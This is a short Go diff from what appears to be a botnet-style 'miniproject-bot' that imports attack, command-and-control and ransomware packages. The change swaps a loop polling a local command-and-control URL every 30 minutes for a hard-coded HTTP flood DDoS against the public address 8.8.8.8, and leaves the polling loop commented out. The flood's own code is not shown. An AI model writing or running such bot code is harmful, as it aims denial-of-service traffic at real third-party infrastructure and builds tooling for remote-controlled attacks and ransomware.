@@ -1,8 +1,7 @@
 package main
 
 import (
-	"time"
-
+	"github.com/goddamnnoob/miniproject-bot/attack"
 	"github.com/goddamnnoob/miniproject-bot/commandandcontrol"
 	"github.com/goddamnnoob/miniproject-bot/ransomeware"
 )
@@ -10,12 +9,21 @@ import (
 const GetAllAttacksUrl string = "http://127.0.0.1:8000/GetAllAttacks"
 
 func main() {
-	go func() {
-		for {
-			CheckAndExecuteAttacks()
-			time.Sleep(30 * time.Minute)
-		}
-	}()
+	attack := attack.DDOS{
+		Host:             "8.8.8.8",
+		Port:             80,
+		Packetbatchcount: 1,
+		AttackType:       "1",
+	}
+	attack.HttpFlood()
+	/*
+		go func() {
+			for {
+				CheckAndExecuteAttacks()
+				time.Sleep(30 * time.Minute)
+			}
+		}()
+	*/
 }
 
 func CheckAndExecuteAttacks() {
